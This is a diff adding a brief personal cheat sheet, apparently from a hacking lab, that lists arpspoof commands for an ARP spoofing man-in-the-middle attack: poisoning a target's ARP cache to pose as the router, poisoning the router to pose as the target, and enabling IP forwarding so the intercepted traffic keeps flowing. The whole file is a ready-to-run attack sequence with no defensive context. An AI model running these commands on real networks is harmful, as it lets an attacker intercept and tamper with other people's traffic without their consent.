@@ -1,0 +1,9 @@
+----- spoofing the target that youare the router ------
+arp -a (10.0.2.1) 
+arpspoof -i eth0 -t 10.0.2.7(ip of target) 10.0.2.1(router ip)
+
+----- spoofing the router that youare the target ------
+arpspoof -i eth0 -t 10.0.2.1(ip of router) 10.0.2.7(ip of target)
+
+----- enable port forwading --------
+echo 1 > /proc/sys/net/ipv4/ip_forward
